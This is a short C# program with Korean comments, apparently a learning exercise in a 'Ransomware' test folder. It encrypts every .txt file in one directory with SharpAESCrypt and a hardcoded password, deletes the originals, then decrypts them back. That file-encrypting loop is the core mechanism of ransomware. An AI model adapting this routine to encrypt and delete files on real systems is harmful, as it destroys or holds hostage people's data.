#C#

using System;
using SharpAESCrypt;

namespace Test
{
    class Program
    {
        static void Main(string[] args)
        {

            //경로 지정
            string dir = @"C:/Layer7Project/Ransomware/test/";
            List<string> files = new List<string>();
            DirectoryInfo d = new DirectoryInfo(dir);


            //원하는 파일의 형식(여러개도 가능)
            foreach (var file in d.GetFiles("*.txt"))
            {
                files.Add(file.ToString());
            }


            //암호화
            foreach (string file in files)
            {
                string encrypted_file = dir + "encrypted_file.txt";
                SharpAESCrypt.SharpAESCrypt.Encrypt("password", file, encrypted_file);
                File.Delete(file);
                File.Move(encrypted_file, file);
            }

            //복호화
            foreach (string file in files)
            {
                string decrypted_file = dir + "decrypted_file.txt";
                SharpAESCrypt.SharpAESCrypt.Decrypt("password", file, decrypted_file);
                File.Delete(file);
                File.Move(decrypted_file, file);
            }
        }
    }
}
